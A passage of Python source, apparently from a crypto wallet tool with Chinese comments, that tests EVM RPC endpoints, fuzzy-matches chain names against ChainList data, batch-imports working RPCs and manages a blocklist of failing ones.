    def _diagnose_rpc_failure(self, rpc_url: str, timeout: int = 5) -> str:
        """诊断RPC失败的具体原因"""
        try:
            import requests
            response = requests.post(rpc_url, 
                json={'jsonrpc': '2.0', 'method': 'eth_chainId', 'params': [], 'id': 1},
                timeout=timeout,
                headers={'Content-Type': 'application/json'})
            
            if response.status_code == 200:
                data = response.json()
                if 'error' in data:
                    error_msg = data['error'].get('message', 'Unknown RPC error')
                    if 'method not found' in error_msg.lower():
                        return "不支持eth_chainId方法（非标准EVM）"
                    else:
                        return f"RPC错误: {error_msg}"
                else:
                    return "响应格式异常"
            else:
                return f"HTTP错误: {response.status_code}"
                
        except requests.exceptions.Timeout:
            return f"超时 (>{timeout}s)"
        except requests.exceptions.ConnectionError:
            return "连接失败"
        except requests.exceptions.SSLError:
            return "SSL证书错误"
        except Exception as e:
            return f"异常: {str(e)[:30]}"

    def _get_chain_id_batch(self, rpc_urls: List[str], timeout: int = 3, max_workers: int = 5) -> Dict[str, int]:
        """批量获取多个RPC的chain ID（多线程版本）"""
        results = {}
        
        def get_chain_id_worker(rpc_url):
            try:
                chain_id = self._get_actual_chain_id(rpc_url, timeout)
                return rpc_url, chain_id
            except Exception:
                return rpc_url, None
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_rpc = {executor.submit(get_chain_id_worker, rpc): rpc for rpc in rpc_urls}
            
            for future in as_completed(future_to_rpc):
                rpc_url = future_to_rpc[future]
                try:
                    rpc_url, chain_id = future.result()
                    results[rpc_url] = chain_id
                except Exception:
                    results[rpc_url] = None
        
        return results

    @lru_cache(maxsize=1000)
    def _normalize_chain_name(self, name: str) -> str:
        """标准化链条名称，用于智能匹配"""
        if not name:
            return ""
        
        # 移除emoji和特殊字符
        normalized = re.sub(r'[^\w\s]', '', name)
        # 转换为小写
        normalized = normalized.lower()
        # 移除常见的后缀词
        suffixes_to_remove = ['mainnet', 'network', 'chain', 'protocol', 'hub', 'labs', 'evm', 'testnet']
        words = normalized.split()
        filtered_words = [word for word in words if word not in suffixes_to_remove]
        # 如果过滤后为空，保留原始单词
        if not filtered_words:
            filtered_words = words
        return ' '.join(filtered_words)

    def _calculate_name_similarity(self, name1: str, name2: str) -> float:
        """计算两个链条名称的相似度"""
        norm1 = self._normalize_chain_name(name1)
        norm2 = self._normalize_chain_name(name2)
        
        # 完全匹配
        if norm1 == norm2:
            return 1.0
        
        # 使用序列匹配器计算相似度
        similarity = difflib.SequenceMatcher(None, norm1, norm2).ratio()
        
        # 检查关键词匹配
        words1 = set(norm1.split())
        words2 = set(norm2.split())
        
        if words1 and words2:
            # 计算词汇交集比例
            intersection = len(words1.intersection(words2))
            union = len(words1.union(words2))
            word_similarity = intersection / union if union > 0 else 0
            
            # 综合相似度
            similarity = max(similarity, word_similarity)
        
        return similarity

    def _smart_match_chain(self, local_name: str, chainlist_data: List[dict], min_similarity: float = 0.6) -> List[dict]:
        """AI智能匹配链条"""
        matches = []
        
        for chain_data in chainlist_data:
            chainlist_name = chain_data.get('name', '')
            if not chainlist_name:
                continue
            
            similarity = self._calculate_name_similarity(local_name, chainlist_name)
            
            if similarity >= min_similarity:
                matches.append({
                    'chain_data': chain_data,
                    'similarity': similarity,
                    'chainlist_name': chainlist_name,
                    'local_name': local_name
                })
        
        # 按相似度排序
        matches.sort(key=lambda x: x['similarity'], reverse=True)
        return matches

    def _ai_enhanced_chain_matching(self, chainlist_data: List[dict], max_workers: int = 8) -> Dict[str, List[dict]]:
        """AI增强的全自动链条匹配系统"""
        print(f"\n{Back.MAGENTA}{Fore.WHITE} 🤖 AI智能链条匹配系统 🤖 {Style.RESET_ALL}")
        print(f"{Fore.CYAN}正在使用AI算法智能匹配所有链条...（{max_workers}线程并发）{Style.RESET_ALL}")
        
        matching_results = {}
        total_local_chains = len(self.networks)
        processed_count = 0
        
        def match_single_chain(network_item):
            network_key, network_info = network_item
            local_name = network_info.get('name', network_key)
            local_chain_id = network_info.get('chain_id')
            
            # 智能匹配
            matches = self._smart_match_chain(local_name, chainlist_data)
            
            # 过滤匹配结果
            filtered_matches = []
            for match in matches[:5]:  # 只取前5个最佳匹配
                chainlist_chain_id = match['chain_data'].get('chainId')
                
                # 如果Chain ID匹配，优先级更高
                if chainlist_chain_id == local_chain_id:
                    match['match_type'] = 'exact_id'
                    match['priority'] = 1
                elif match['similarity'] >= 0.8:
                    match['match_type'] = 'high_similarity'
                    match['priority'] = 2
                elif match['similarity'] >= 0.6:
                    match['match_type'] = 'medium_similarity'
                    match['priority'] = 3
                else:
                    continue
                
                filtered_matches.append(match)
            
            # 按优先级排序
            filtered_matches.sort(key=lambda x: (x['priority'], -x['similarity']))
            
            return network_key, {
                'local_info': network_info,
                'matches': filtered_matches,
                'best_match': filtered_matches[0] if filtered_matches else None
            }
        
        # 多线程处理匹配
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            network_items = list(self.networks.items())
            future_to_network = {executor.submit(match_single_chain, item): item for item in network_items}
            
            for future in as_completed(future_to_network):
                processed_count += 1
                print(f"\r{Fore.YELLOW}🤖 AI匹配进度: {processed_count}/{total_local_chains} ({processed_count*100//total_local_chains}%)...{Style.RESET_ALL}", end='', flush=True)
                
                try:
                    network_key, result = future.result()
                    matching_results[network_key] = result
                except Exception as e:
                    network_item = future_to_network[future]
                    print(f"\n⚠️ 匹配 {network_item[0]} 时出错: {e}")
        
        print(f"\n\n{Back.GREEN}{Fore.BLACK} 🎯 AI匹配完成 🎯 {Style.RESET_ALL}")
        
        # 统计匹配结果
        exact_matches = sum(1 for result in matching_results.values() 
                          if result['best_match'] and result['best_match']['match_type'] == 'exact_id')
        high_similarity = sum(1 for result in matching_results.values() 
                            if result['best_match'] and result['best_match']['match_type'] == 'high_similarity')
        medium_similarity = sum(1 for result in matching_results.values() 
                              if result['best_match'] and result['best_match']['match_type'] == 'medium_similarity')
        no_matches = sum(1 for result in matching_results.values() if not result['best_match'])
        
        print(f"🎯 精确匹配 (Chain ID相同): {Fore.GREEN}{exact_matches}{Style.RESET_ALL} 个")
        print(f"🔥 高相似度匹配 (>80%): {Fore.YELLOW}{high_similarity}{Style.RESET_ALL} 个")
        print(f"📊 中等相似度匹配 (>60%): {Fore.CYAN}{medium_similarity}{Style.RESET_ALL} 个")
        print(f"❓ 未找到匹配: {Fore.RED}{no_matches}{Style.RESET_ALL} 个")
        
        return matching_results

    def _test_rpc_batch(self, rpc_urls: List[str], timeout: int = 3, max_workers: int = 8, quick_test: bool = False) -> Dict[str, bool]:
        """批量测试多个RPC的连通性（多线程版本）"""
        results = {}
        
        def test_rpc_worker(rpc_url):
            try:
                is_valid = self._is_valid_rpc_url(rpc_url, timeout=timeout, quick_test=quick_test)
                return rpc_url, is_valid
            except Exception:
                return rpc_url, False
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_rpc = {executor.submit(test_rpc_worker, rpc): rpc for rpc in rpc_urls}
            
            for future in as_completed(future_to_rpc):
                rpc_url = future_to_rpc[future]
                try:
                    rpc_url, is_valid = future.result()
                    results[rpc_url] = is_valid
                except Exception:
                    results[rpc_url] = False
        
        return results

    def _process_chainlist_data(self, chainlist_data: list):
        """处理ChainList数据并导入RPC"""
        print(f"\n{Fore.CYAN}🔄 正在分析ChainList数据...{Style.RESET_ALL}")
        
        # 自动校准chain ID
        calibrated_data = self._auto_calibrate_chain_ids(chainlist_data)
        
        matched_networks = {}  # network_key -> [rpc_urls]
        unmatched_chains = []
        total_rpcs_found = 0
        
        # 创建chain_id到network_key的映射
        chain_id_map = {}
        for network_key, network_info in self.networks.items():
            chain_id_map[network_info['chain_id']] = network_key
        # 创建名称到network_key的模糊映射（备用：当chainId对不上时）
        name_map = {}
        for network_key, network_info in self.networks.items():
            name_tokens = [network_info.get('name', ''), network_key]
            for token in name_tokens:
                if not token:
                    continue
                normalized = token.lower().replace(' ', '').replace('_', '')
                # 去除常见emoji和符号
                normalized = ''.join(ch for ch in normalized if ch.isalnum())
                if not normalized:
                    continue
                name_map.setdefault(normalized, set()).add(network_key)
        
        for chain_data in calibrated_data:
            try:
                chain_id = chain_data.get('chainId')
                chain_name = chain_data.get('name', '')
                rpc_list = chain_data.get('rpc', [])
                
                if not chain_id or not rpc_list:
                    continue
                
                # 提取RPC URLs
                rpc_urls = []
                for rpc_entry in rpc_list:
                    if isinstance(rpc_entry, dict):
                        url = rpc_entry.get('url', '')
                    elif isinstance(rpc_entry, str):
                        url = rpc_entry
                    else:
                        continue
                    
                    # 验证RPC URL
                    if url and self._is_valid_rpc_url(url):
                        rpc_urls.append(url)
                
                total_rpcs_found += len(rpc_urls)
                
                # 尝试匹配到现有网络（优先按chainId）
                if chain_id in chain_id_map:
                    network_key = chain_id_map[chain_id]
                else:
                    # 名称模糊匹配作为回退
                    normalized_name = chain_name.lower().replace(' ', '').replace('_', '')
                    normalized_name = ''.join(ch for ch in normalized_name if ch.isalnum())
                    candidates = list(name_map.get(normalized_name, []))
                    network_key = candidates[0] if candidates else None

                if network_key:
                    if network_key not in matched_networks:
                        matched_networks[network_key] = []
                    matched_networks[network_key].extend(rpc_urls)
                else:
                    unmatched_chains.append({
                        'chainId': chain_id,
                        'name': chain_name,
                        'rpc_count': len(rpc_urls)
                    })
                    
            except Exception as e:
                self.logger.warning(f"解析链条数据失败: {e}")
                continue
        
        print(f"\n{Back.CYAN}{Fore.BLACK} 📊 分析结果 📊 {Style.RESET_ALL}")
        print(f"📡 总计发现RPC: {Fore.CYAN}{total_rpcs_found}{Style.RESET_ALL} 个")
        print(f"✅ 匹配的网络: {Fore.GREEN}{len(matched_networks)}{Style.RESET_ALL} 个")
        print(f"❓ 未匹配的链条: {Fore.YELLOW}{len(unmatched_chains)}{Style.RESET_ALL} 个")
        
        if not matched_networks:
            print(f"\n{Fore.YELLOW}⚠️ 没有找到匹配的网络，操作结束{Style.RESET_ALL}")
            return
        
        # 显示匹配的网络详情
        print(f"\n{Fore.YELLOW}🎯 匹配的网络详情：{Style.RESET_ALL}")
        for network_key, rpc_urls in matched_networks.items():
            network_name = self.networks[network_key]['name']
            print(f"  • {Fore.CYAN}{network_name}{Style.RESET_ALL}: 发现 {Fore.GREEN}{len(rpc_urls)}{Style.RESET_ALL} 个RPC")
        
        # 显示部分未匹配的链条
        if unmatched_chains:
            print(f"\n{Fore.YELLOW}❓ 部分未匹配的链条（前10个）：{Style.RESET_ALL}")
            for chain in unmatched_chains[:10]:
                print(f"  • ID {chain['chainId']}: {chain['name']} ({chain['rpc_count']} RPC)")
            if len(unmatched_chains) > 10:
                print(f"  • ... 还有 {len(unmatched_chains) - 10} 个")
        
        # 确认导入
        print(f"\n{Fore.YELLOW}🚀 准备导入操作：{Style.RESET_ALL}")
        total_import_rpcs = sum(len(rpcs) for rpcs in matched_networks.values())
        print(f"  📊 将为 {len(matched_networks)} 个网络导入 {total_import_rpcs} 个RPC")
        print(f"  🔍 每个RPC都会进行快速连接测试（1秒超时）")
        print(f"  ⚡ 超过1秒无响应的RPC将被自动拉黑")
        print(f"  ❌ 连接失败的RPC会自动屏蔽")
        
        confirm = self.safe_input(f"\n{Fore.YELLOW}➜ 确认开始导入？(y/N): {Style.RESET_ALL}").strip().lower()
        if confirm != 'y':
            print(f"\n{Fore.YELLOW}⚠️ 导入操作已取消{Style.RESET_ALL}")
            return
        
        # 开始批量导入
        self._batch_import_rpcs(matched_networks)
    
    def _batch_import_rpcs(self, matched_networks: dict):
        """批量导入RPC"""
        print(f"\n{Back.GREEN}{Fore.BLACK} 🚀 开始批量导入RPC 🚀 {Style.RESET_ALL}")
        
        total_success = 0
        total_failed = 0
        total_skipped = 0
        import_summary = {}
        
        for network_key, rpc_urls in matched_networks.items():
            network_name = self.networks[network_key]['name']
            print(f"\n{Fore.CYAN}🔄 处理网络: {network_name}（使用多线程加速）{Style.RESET_ALL}")
            
            # 过滤需要测试的RPC
            test_rpcs = []
            skipped_count = 0
            
            for rpc_url in rpc_urls:
                # 检查是否已存在
                if rpc_url in self.networks[network_key]['rpc_urls']:
                    skipped_count += 1
                    continue
                
                # 检查是否已被拉黑
                if rpc_url in self.blocked_rpcs:
                    skipped_count += 1
                    continue
                
                test_rpcs.append(rpc_url)
            
            if not test_rpcs:
                print(f"  {Fore.YELLOW}⏭️ 所有RPC已存在或被拉黑，跳过测试{Style.RESET_ALL}")
                import_summary[network_key] = {
                    'name': network_name,
                    'success': 0,
                    'failed': 0,
                    'skipped': skipped_count
                }
                total_skipped += skipped_count
                continue
            
            print(f"  📊 准备测试: {len(test_rpcs)} 个RPC（跳过 {skipped_count} 个）")
            
            # 多线程批量测试RPC
            success_count = 0
            failed_count = 0
            
            def test_and_add_rpc(rpc_url):
                """测试并添加单个RPC"""
                import time
                start_time = time.time()
                
                try:
                    if self._is_valid_rpc_url(rpc_url, timeout=3, quick_test=True):
                        # 添加到网络配置
                        self.networks[network_key]['rpc_urls'].append(rpc_url)
                        elapsed = time.time() - start_time
                        return {
                            'rpc_url': rpc_url,
                            'success': True,
                            'elapsed': elapsed,
                            'message': f"成功({elapsed:.2f}s)"
                        }
                    else:
                        elapsed = time.time() - start_time
                        return {
                            'rpc_url': rpc_url,
                            'success': False,
                            'elapsed': elapsed,
                            'message': f"失败({elapsed:.2f}s)"
                        }
                except Exception as e:
                    elapsed = time.time() - start_time
                    return {
                        'rpc_url': rpc_url,
                        'success': False,
                        'elapsed': elapsed,
                        'message': f"异常({elapsed:.2f}s): {str(e)[:20]}"
                    }
            
            # 使用线程池并发测试（限制线程数避免过载）
            completed_count = 0
            with ThreadPoolExecutor(max_workers=5) as executor:
                future_to_rpc = {executor.submit(test_and_add_rpc, rpc): rpc for rpc in test_rpcs}
                
                for future in as_completed(future_to_rpc):
                    completed_count += 1
                    rpc_url = future_to_rpc[future]
                    
                    # 更新进度
                    print(f"\r  🚀 测试进度: {completed_count}/{len(test_rpcs)} ({completed_count*100//len(test_rpcs)}%)...", end='', flush=True)
                    
                    try:
                        result = future.result()
                        
                        if result['success']:
                            success_count += 1
                            print(f"\n    ✅ {rpc_url[:50]}... {Fore.GREEN}{result['message']}{Style.RESET_ALL}")
                        else:
                            failed_count += 1
                            # 自动拉黑失败的RPC
                            reason = "超过3秒超时" if result['elapsed'] >= 3.0 else "连接失败"
                            self.blocked_rpcs[rpc_url] = {
                                'reason': f'ChainList批量导入时{reason}',
                                'blocked_time': time.time(),
                                'network': network_key,
                                'test_duration': result['elapsed']
                            }
                            print(f"\n    ❌ {rpc_url[:50]}... {Fore.RED}{result['message']}{Style.RESET_ALL}")
                            
                    except Exception as e:
                        failed_count += 1
                        print(f"\n    💥 {rpc_url[:50]}... {Fore.RED}处理异常: {str(e)[:30]}{Style.RESET_ALL}")
            
            print(f"\n  📊 {network_name}: ✅{success_count} ❌{failed_count} ⏭️{skipped_count}")
            
            import_summary[network_key] = {
                'name': network_name,
                'success': success_count,
                'failed': failed_count,
                'skipped': skipped_count
            }
            
            total_success += success_count
            total_failed += failed_count
            total_skipped += skipped_count
        
        # 显示导入总结
        print(f"\n{Back.GREEN}{Fore.BLACK} 📋 导入完成总结 📋 {Style.RESET_ALL}")
        print(f"✅ 成功导入: {Fore.GREEN}{total_success}{Style.RESET_ALL} 个RPC")
        print(f"❌ 失败拉黑: {Fore.RED}{total_failed}{Style.RESET_ALL} 个RPC（包括超时）")
        print(f"⏭️ 跳过重复: {Fore.YELLOW}{total_skipped}{Style.RESET_ALL} 个RPC")
        
        # 显示被拉黑的RPC统计
        if total_failed > 0:
            timeout_count = sum(1 for rpc_url, info in self.blocked_rpcs.items() 
                              if '超过1秒超时' in info.get('reason', ''))
            if timeout_count > 0:
                print(f"⚡ 其中超时拉黑: {Fore.YELLOW}{timeout_count}{Style.RESET_ALL} 个RPC")
        print(f"📊 总处理量: {Fore.CYAN}{total_success + total_failed + total_skipped}{Style.RESET_ALL} 个RPC")
        
        # 显示详细结果
        if import_summary:
            print(f"\n{Fore.YELLOW}📋 各网络导入详情：{Style.RESET_ALL}")
            for network_key, summary in import_summary.items():
                if summary['success'] > 0:
                    print(f"  🟢 {summary['name']}: +{summary['success']} 个新RPC")
        
        # 更新缓存
        if total_success > 0:
            print(f"\n{Fore.GREEN}🔄 正在更新RPC状态缓存...{Style.RESET_ALL}")
            # 清除相关网络的缓存，强制重新检测
            for network_key in matched_networks.keys():
                self.rpc_test_cache.pop(network_key, None)
            print(f"{Fore.GREEN}✅ 缓存已清除，下次检测将使用新的RPC{Style.RESET_ALL}")
        
        # 保存状态
        self.save_state()
        print(f"\n{Fore.GREEN}🎉 ChainList RPC导入操作完成！{Style.RESET_ALL}")
    
    def manage_blocked_rpcs(self):
        """管理被拉黑的RPC"""
        print(f"\n{Back.RED}{Fore.WHITE} 🚫 被拉黑的RPC管理 🚫 {Style.RESET_ALL}")
        
        if not self.blocked_rpcs:
            print(f"\n{Fore.GREEN}✅ 目前没有被拉黑的RPC{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.CYAN}📊 被拉黑的RPC统计：{Style.RESET_ALL}")
        print(f"总数量: {Fore.YELLOW}{len(self.blocked_rpcs)}{Style.RESET_ALL} 个")
        
        # 按拉黑原因分类统计
        reason_stats = {}
        timeout_count = 0
        for rpc_url, info in self.blocked_rpcs.items():
            reason = info.get('reason', '未知原因')
            reason_stats[reason] = reason_stats.get(reason, 0) + 1
            if '超过1秒超时' in reason:
                timeout_count += 1
        
        print(f"\n{Fore.YELLOW}📋 拉黑原因分布：{Style.RESET_ALL}")
        for reason, count in reason_stats.items():
            print(f"  • {reason}: {Fore.CYAN}{count}{Style.RESET_ALL} 个")
        
        if timeout_count > 0:
            print(f"\n{Fore.YELLOW}⚡ 超时拉黑RPC: {timeout_count} 个{Style.RESET_ALL}")
        
        # 显示最近拉黑的RPC
        print(f"\n{Fore.YELLOW}🕒 最近拉黑的RPC（前10个）：{Style.RESET_ALL}")
        import time
        sorted_rpcs = sorted(self.blocked_rpcs.items(), 
                           key=lambda x: x[1].get('blocked_time', 0), reverse=True)
        
        for i, (rpc_url, info) in enumerate(sorted_rpcs[:10], 1):
            blocked_time = info.get('blocked_time', 0)
            reason = info.get('reason', '未知原因')
            network = info.get('network', '未知网络')
            test_duration = info.get('test_duration', 0)
            
            time_str = time.strftime('%H:%M:%S', time.localtime(blocked_time))
            duration_str = f"({test_duration:.2f}s)" if test_duration > 0 else ""
            
            print(f"  {i:2d}. {rpc_url[:50]}...")
            print(f"      网络: {Fore.CYAN}{network}{Style.RESET_ALL} | "
                  f"时间: {Fore.YELLOW}{time_str}{Style.RESET_ALL} | "
                  f"原因: {Fore.RED}{reason}{Style.RESET_ALL} {duration_str}")
        
        if len(sorted_rpcs) > 10:
            print(f"      ... 还有 {len(sorted_rpcs) - 10} 个")
        
        # 管理选项
        print(f"\n{Fore.YELLOW}🔧 管理选项：{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}1.{Style.RESET_ALL} 🔄 重新测试所有被拉黑的RPC")
        print(f"  {Fore.GREEN}2.{Style.RESET_ALL} 🗑️  清空所有被拉黑的RPC")
        print(f"  {Fore.GREEN}3.{Style.RESET_ALL} ⚡ 只清空超时拉黑的RPC")
        print(f"  {Fore.GREEN}4.{Style.RESET_ALL} 📋 导出被拉黑的RPC列表")
        print(f"  {Fore.RED}0.{Style.RESET_ALL} 🔙 返回")
        
        choice = self.safe_input(f"\n{Fore.YELLOW}请选择操作 (0-4): {Style.RESET_ALL}").strip()
        
        if choice == '1':
            self._retest_blocked_rpcs()
        elif choice == '2':
            self._clear_all_blocked_rpcs()
        elif choice == '3':
            self._clear_timeout_blocked_rpcs()
        elif choice == '4':
            self._export_blocked_rpcs()
        elif choice == '0':
            return
        else:
            print(f"\n{Fore.RED}❌ 无效选择{Style.RESET_ALL}")
    
    def _retest_blocked_rpcs(self):
        """重新测试被拉黑的RPC"""
        print(f"\n{Fore.CYAN}🔄 重新测试被拉黑的RPC...{Style.RESET_ALL}")
        
        if not self.blocked_rpcs:
            print(f"{Fore.YELLOW}⚠️ 没有被拉黑的RPC需要测试{Style.RESET_ALL}")
            return
        
        unblocked_count = 0
        total_count = len(self.blocked_rpcs)
        rpcs_to_remove = []
        
        # 创建网络名称映射
        network_names = {key: info['name'] for key, info in self.networks.items()}
        
        print(f"📊 开始测试 {total_count} 个被拉黑的RPC...")
        
        for i, (rpc_url, info) in enumerate(self.blocked_rpcs.items(), 1):
            network_key = info.get('network', '')
            print(f"  {i}/{total_count} 测试: {rpc_url[:50]}...", end=" ", flush=True)
            
            if network_key in self.networks:
                network_info = self.networks[network_key]
                # 使用正常超时（不是快速测试）
                if self.test_rpc_connection(rpc_url, network_info['chain_id'], timeout=5):
                    print(f"{Fore.GREEN}恢复{Style.RESET_ALL}")
                    rpcs_to_remove.append(rpc_url)
                    unblocked_count += 1
                else:
                    print(f"{Fore.RED}仍失败{Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}网络不存在{Style.RESET_ALL}")
                rpcs_to_remove.append(rpc_url)
        
        # 移除恢复的RPC
        for rpc_url in rpcs_to_remove:
            del self.blocked_rpcs[rpc_url]
        
        print(f"\n{Fore.GREEN}✅ 重测完成！{Style.RESET_ALL}")
        print(f"恢复RPC: {Fore.GREEN}{unblocked_count}{Style.RESET_ALL} 个")
        print(f"仍被拉黑: {Fore.RED}{total_count - unblocked_count}{Style.RESET_ALL} 个")
    
    def _clear_all_blocked_rpcs(self):
        """清空所有被拉黑的RPC"""
        count = len(self.blocked_rpcs)
        confirm = self.safe_input(f"\n{Fore.YELLOW}⚠️ 确认清空所有 {count} 个被拉黑的RPC？(y/N): {Style.RESET_ALL}").strip().lower()
        
        if confirm == 'y':
            self.blocked_rpcs.clear()
            print(f"\n{Fore.GREEN}✅ 已清空所有被拉黑的RPC{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.YELLOW}⚠️ 操作已取消{Style.RESET_ALL}")
    
    def _clear_timeout_blocked_rpcs(self):
        """只清空超时拉黑的RPC"""
        timeout_rpcs = [url for url, info in self.blocked_rpcs.items() 
                       if '超过1秒超时' in info.get('reason', '')]
        
        if not timeout_rpcs:
            print(f"\n{Fore.YELLOW}⚠️ 没有超时拉黑的RPC{Style.RESET_ALL}")
            return
        
        confirm = self.safe_input(f"\n{Fore.YELLOW}⚠️ 确认清空 {len(timeout_rpcs)} 个超时拉黑的RPC？(y/N): {Style.RESET_ALL}").strip().lower()
        
        if confirm == 'y':
            for url in timeout_rpcs:
                del self.blocked_rpcs[url]
            print(f"\n{Fore.GREEN}✅ 已清空 {len(timeout_rpcs)} 个超时拉黑的RPC{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.YELLOW}⚠️ 操作已取消{Style.RESET_ALL}")
    
    def _export_blocked_rpcs(self):
        """导出被拉黑的RPC列表"""
        if not self.blocked_rpcs:
            print(f"\n{Fore.YELLOW}⚠️ 没有被拉黑的RPC可导出{Style.RESET_ALL}")
            return
        
        import json
        import os
        
        filename = f"blocked_rpcs_{int(time.time())}.json"
        filepath = os.path.join(os.getcwd(), filename)
        
        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(self.blocked_rpcs, f, indent=2, ensure_ascii=False)
            
            print(f"\n{Fore.GREEN}✅ 被拉黑的RPC列表已导出到: {filepath}{Style.RESET_ALL}")
            print(f"📊 包含 {len(self.blocked_rpcs)} 个RPC记录")
        except Exception as e:
            print(f"\n{Fore.RED}❌ 导出失败: {e}{Style.RESET_ALL}")

    def manage_zero_rpc_chains(self):
        """专门管理无可用RPC的链条"""
        print(f"\n{Back.RED}{Fore.WHITE} 🚨 管理无可用RPC的链条 🚨 {Style.RESET_ALL}")
        
        # 检查是否有缓存数据
        cache_exists = bool(self.rpc_test_cache)
        if cache_exists:
            print(f"{Fore.GREEN}📋 检测到上次的RPC测试缓存{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}选择检测模式：{Style.RESET_ALL}")
            print(f"  {Fore.GREEN}1.{Style.RESET_ALL} 📋 使用缓存数据 (快速，推荐)")
            print(f"  {Fore.GREEN}2.{Style.RESET_ALL} 🔄 重新检测所有网络 (较慢)")
            
            choice = self.safe_input(f"\n{Fore.CYAN}➜ 请选择 (1-2，默认1): {Style.RESET_ALL}").strip() or "1"
            
            if choice == "2":
                print(f"{Fore.CYAN}🔄 重新检测所有网络的RPC状态...{Style.RESET_ALL}")
                rpc_results = self.get_cached_rpc_results(force_refresh=True)
            else:
                print(f"{Fore.CYAN}📋 使用缓存数据检测无可用RPC的网络...{Style.RESET_ALL}")
                rpc_results = self.get_cached_rpc_results(force_refresh=False)
        else:
            print(f"{Fore.CYAN}🔄 首次检测网络RPC状态...{Style.RESET_ALL}")
            rpc_results = self.get_cached_rpc_results(force_refresh=True)
        
        # 只筛选出完全没有可用RPC的网络
        zero_rpc_networks = []
        
        for network_key, result in rpc_results.items():
            available_count = result['available_count']
            
            if available_count == 0:
                zero_rpc_networks.append({
                    'network_key': network_key,
                    'name': result['name'],
                    'chain_id': result['chain_id'],
                    'total_rpcs': result['total_count'],
                    'available_rpcs': available_count,
                    'failed_rpcs': len(result['failed_rpcs']),
                    'currency': result['currency']
                })
        
        # 显示结果
        if not zero_rpc_networks:
            print(f"\n{Fore.GREEN}🎉 太好了！所有网络都至少有1个可用的RPC{Style.RESET_ALL}")
            print(f"{Fore.CYAN}💡 如果需要管理RPC数量不足的链条，请使用原有功能{Style.RESET_ALL}")
            self.safe_input(f"\n{Fore.MAGENTA}🔙 按回车键返回...{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.RED}🚨 发现 {len(zero_rpc_networks)} 个网络完全没有可用RPC：{Style.RESET_ALL}")
        print(f"{Fore.CYAN}─" * 80 + f"{Style.RESET_ALL}")
        
        for i, chain in enumerate(zero_rpc_networks, 1):
            print(f"  {Fore.GREEN}{i:2d}.{Style.RESET_ALL} {Fore.RED}❌ {chain['name']:<30}{Style.RESET_ALL} ({chain['currency']:<6}) "
                  f"- 总计: {chain['total_rpcs']} 个RPC，{Fore.RED}全部失效{Style.RESET_ALL}")
            print(f"      Chain ID: {Fore.CYAN}{chain['chain_id']}{Style.RESET_ALL}, Network Key: {Fore.MAGENTA}{chain['network_key']}{Style.RESET_ALL}")
        
        # 管理选项
        print(f"\n{Fore.YELLOW}🛠️ 管理选项：{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}1.{Style.RESET_ALL} 🔧 选择单个网络添加RPC (添加后继续处理其他网络)")
        print(f"  {Fore.GREEN}2.{Style.RESET_ALL} 🚀 为所有无RPC网络批量添加RPC")
        print(f"  {Fore.GREEN}3.{Style.RESET_ALL} 📋 查看详细的失效RPC信息")
        print(f"  {Fore.GREEN}4.{Style.RESET_ALL} 🔄 重新测试所有失效的RPC")
        print(f"  {Fore.GREEN}5.{Style.RESET_ALL} 🔄 刷新检测结果 (重新检测所有网络)")
        print(f"  {Fore.RED}0.{Style.RESET_ALL} 🔙 返回RPC管理菜单")
        
        action = self.safe_input(f"\n{Fore.CYAN}➜ 请选择操作: {Style.RESET_ALL}").strip()
        
        try:
            if action == '1':
                # 选择单个网络添加RPC (增量模式)
                self._select_and_add_rpc_incremental(zero_rpc_networks)
            elif action == '2':
                # 批量为所有网络添加RPC
                self._batch_add_rpc_for_zero_chains(zero_rpc_networks)
            elif action == '3':
                # 查看详细信息
                self._show_zero_rpc_details(zero_rpc_networks)
            elif action == '4':
                # 重新测试失效RPC
                self._retest_zero_rpc_chains(zero_rpc_networks)
            elif action == '5':
                # 刷新检测结果
                print(f"{Fore.CYAN}🔄 正在重新检测所有网络...{Style.RESET_ALL}")
                self.manage_zero_rpc_chains()  # 递归调用，但会强制刷新
                return
            elif action == '0':
                return
            else:
                print(f"\n{Fore.RED}❌ 无效选择{Style.RESET_ALL}")
                
        except Exception as e:
            print(f"\n{Fore.RED}❌ 操作失败: {e}{Style.RESET_ALL}")
        
        self.safe_input(f"\n{Fore.MAGENTA}🔙 按回车键继续...{Style.RESET_ALL}")
        # 递归调用显示管理界面
        self.manage_zero_rpc_chains()

    def _select_and_add_rpc_for_zero_chains(self, zero_rpc_networks: list):
        """选择单个网络添加RPC"""
        print(f"\n{Fore.CYAN}🔧 选择要添加RPC的网络：{Style.RESET_ALL}")
        
        for i, chain in enumerate(zero_rpc_networks, 1):
            print(f"  {Fore.GREEN}{i}.{Style.RESET_ALL} {chain['name']} ({chain['currency']})")
        
        choice = self.safe_input(f"\n{Fore.YELLOW}请选择网络编号 (1-{len(zero_rpc_networks)}): {Style.RESET_ALL}").strip()
        
        if not choice.isdigit() or not (1 <= int(choice) <= len(zero_rpc_networks)):
            print(f"{Fore.RED}❌ 无效选择{Style.RESET_ALL}")
            return
        
        selected_chain = zero_rpc_networks[int(choice) - 1]
        print(f"\n{Fore.CYAN}🎯 为网络 {Fore.YELLOW}{selected_chain['name']}{Style.RESET_ALL} 添加RPC")
        self._add_rpc_for_chain(selected_chain['network_key'], selected_chain['name'])

    def _select_and_add_rpc_incremental(self, zero_rpc_networks: list):
        """增量模式：选择单个网络添加RPC，添加后继续处理其他网络"""
        while zero_rpc_networks:
            print(f"\n{Fore.CYAN}🔧 选择要添加RPC的网络 (剩余 {len(zero_rpc_networks)} 个无RPC网络)：{Style.RESET_ALL}")
            
            for i, chain in enumerate(zero_rpc_networks, 1):
                print(f"  {Fore.GREEN}{i}.{Style.RESET_ALL} {chain['name']} ({chain['currency']})")
            print(f"  {Fore.YELLOW}0.{Style.RESET_ALL} 🔙 完成添加，返回菜单")
            
            choice = self.safe_input(f"\n{Fore.YELLOW}请选择网络编号 (0-{len(zero_rpc_networks)}): {Style.RESET_ALL}").strip()
            
            if choice == '0':
                print(f"{Fore.GREEN}✅ 增量添加已完成{Style.RESET_ALL}")
                break
                
